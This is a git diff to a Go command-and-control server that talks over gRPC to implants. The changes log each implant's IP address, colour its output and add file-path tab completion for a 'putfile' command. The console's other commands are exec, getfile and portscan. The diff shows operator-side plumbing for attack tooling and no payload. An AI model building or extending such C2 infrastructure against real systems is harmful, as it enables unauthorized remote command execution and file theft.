@@ -3,6 +3,10 @@ package main
 import (
 	"context"
 	"fmt"
+	"github.com/chzyer/readline"
+	"google.golang.org/grpc"
+	"google.golang.org/grpc/credentials"
+	"google.golang.org/grpc/peer"
 	"io"
 	"io/ioutil"
 	"log"
@@ -13,10 +17,6 @@ import (
 	"strconv"
 	"strings"
 	"time"
-
-	"github.com/chzyer/readline"
-	"google.golang.org/grpc"
-	"google.golang.org/grpc/credentials"
 )
 
 type c2 struct {
@@ -29,15 +29,16 @@ func (c2 *c2) writeString(str string) {
 	log.Print(str)
 }
 
-func (c2 *c2) handleReply(reply *pb.ImplantReply) {
+func (c2 *c2) handleReply(ip string, reply *pb.ImplantReply) {
+	log.SetPrefix("\033[31m[\033[0m" + ip + "\033[31m]\033[0m ")
 	if err := reply.GetError(); err != 0 {
-		c2.writeString("Error: " + types.ErrorToString[err] + "\n")
+		c2.writeString("\033[31mError: " + types.ErrorToString[err] + "\033[0m\n")
 	} else {
 		c2.writeString(strings.Replace(reply.String(), "\\n", "\n", -1) + "\n")
 	}
 }
 
-func (c2 *c2) CheckCommandQueue(_ context.Context, req *pb.CheckCmdRequest) (*pb.CheckCmdReply, error) {
+func (c2 *c2) CheckCommandQueue(ctx context.Context, req *pb.CheckCmdRequest) (*pb.CheckCmdReply, error) {
 	switch u := req.Message.(type) {
 	case *pb.CheckCmdRequest_Heartbeat:
 		select {
@@ -50,7 +51,13 @@ func (c2 *c2) CheckCommandQueue(_ context.Context, req *pb.CheckCmdRequest) (*pb
 		default:
 		}
 	case *pb.CheckCmdRequest_Reply:
-		c2.handleReply(u.Reply)
+		var ip string
+		if peer, ok := peer.FromContext(ctx); ok {
+			ip = peer.Addr.String()
+		} else {
+			ip = "no ip"
+		}
+		c2.handleReply(ip, u.Reply)
 	default:
 		fmt.Println(req, u)
 		panic("Didn't received a valid message")
@@ -153,10 +160,40 @@ func filterInput(r rune) (rune, bool) {
 	return r, true
 }
 
+// Function constructor - constructs new function for listing given directory
+func listfiles(line string) []string {
+	names := make([]string, 0)
+
+	filename := strings.TrimSpace(line)
+	parts := strings.Split(filename, " ")
+	var dir string
+	if len(parts) == 1 {
+		dir = "./"
+	} else {
+		filename = parts[1]
+		last_index := strings.LastIndex(filename, "/")
+
+		if last_index == -1 {
+			last_index = len(filename) - 1
+		}
+
+		dir = filename[:last_index+1]
+		filename = filename[last_index+1:]
+	}
+
+	files, _ := ioutil.ReadDir(dir)
+	for _, f := range files {
+		if (dir == "./" || strings.HasPrefix(f.Name(), filename)) && !strings.HasPrefix(f.Name(), ".") {
+			names = append(names, dir+f.Name())
+		}
+	}
+	return names
+}
+
 var completer = readline.NewPrefixCompleter(
 	readline.PcItem("exec"),
 	readline.PcItem("getfile"),
-	readline.PcItem("putfile"),
+	readline.PcItem("putfile", readline.PcItemDynamic(listfiles)),
 	readline.PcItem("portscan"),
 	readline.PcItem("help"),
 )
@@ -171,6 +208,8 @@ func main() {
 	if err != nil {
 		panic(err)
 	}
+
+	log.SetFlags(log.Ltime)
 
 	l, err := readline.NewEx(&readline.Config{
 		Prompt:          "\033[34mc2%\033[0m ",
